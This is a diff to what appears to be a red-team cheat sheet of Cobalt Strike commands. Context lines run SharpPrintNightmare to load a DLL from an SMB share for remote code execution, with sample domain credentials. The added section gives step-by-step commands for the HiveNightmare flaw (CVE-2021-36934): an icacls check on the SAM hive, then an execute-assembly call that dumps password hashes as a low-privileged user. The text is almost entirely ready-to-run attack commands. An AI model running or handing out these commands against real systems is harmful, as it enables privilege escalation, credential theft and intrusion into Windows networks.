@@ -97,6 +97,20 @@ execute-assembly C:\SharpPrintNightmare.exe '\\192.168.1.215\smb\addCube.dll' '\
 # RCE using runas /netonly
 execute-assembly C:\SharpPrintNightmare.exe '\\192.168.1.215\smb\addCube.dll' '\\192.168.1.10' hackit.local domain_user Pass123
 ```
+
+### HiveNightmare priv esc SAM dump (CVE-2021–36934)
+Exploit in Windows 10 and 11 which allows you to read the SAM, SYSTEM and SECURITY hives as a low-privileged user
+```
+# First check privileges to read SAM hive
+run icacls C:\Windows\System32\config\SAM
+--> If the results show success and the group BUILTIN\Users has privileges (I)(RX) then the SAM file should be readable by all users! 
+
+# Exploit: Csharp implementation [HERE](https://github.com/cube0x0/CVE-2021-36934)
+execute-assembly C:\CVE-2021-36934.exe
+--> Dumps hashes to console upon successful exploitation
+
+```
+
 ------------------------------------------------------------------------------------------
 ## Lateral Movement
 Cobalt Strike jumping
